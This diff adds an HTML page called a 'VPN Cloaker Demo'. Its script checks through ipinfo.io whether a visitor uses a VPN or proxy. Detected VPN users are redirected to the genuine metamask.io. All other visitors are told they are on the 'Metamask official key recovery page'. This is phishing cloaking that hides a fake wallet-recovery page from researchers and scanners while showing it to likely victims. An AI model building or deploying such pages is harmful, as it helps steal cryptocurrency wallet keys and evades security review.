@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>VPN Cloaker Demo</title>
+  <style>
+    body {
+      background: #0b1120;
+      color: #ffffff;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #00ffff;
+    }
+    p {
+      margin-top: 20px;
+      color: #ccc;
+      max-width: 500px;
+    }
+    .loading {
+      margin-top: 40px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <h1>🛡️ VPN Detection Cloaker</h1>
+  <p>
+    Don't Use VPN for visiting this site to  <a href="https://metamask.io" target="_blank">metamask.io</a> as a cloaking behavior.
+  </p>
+  <p class="loading">Checking your connection type...</p>
+
+  <script>
+    fetch("https://ipinfo.io/json?token=97788c7d33c9af")
+      .then(res => res.json())
+      .then(data => {
+        const isVPN = data?.privacy?.vpn || data?.privacy?.proxy || false;
+
+        console.log("IP Info:", data);
+        console.log("Detected VPN/Proxy:", isVPN);
+
+        if (isVPN) {
+          document.querySelector(".loading").textContent = "VPN Detected. Redirecting to metamask.io...";
+          setTimeout(() => {
+            window.location.href = "https://metamask.io";
+          }, 3000);
+        } else {
+          document.querySelector(".loading").textContent = "No VPN detected. You are Metamask official key recovery page.";
+        }
+      })
+      .catch(err => {
+        console.error("IP Info Error:", err);
+        document.querySelector(".loading").textContent = "Unable to determine connection type.";
+      });
+  </script>
+</body>
+</html>
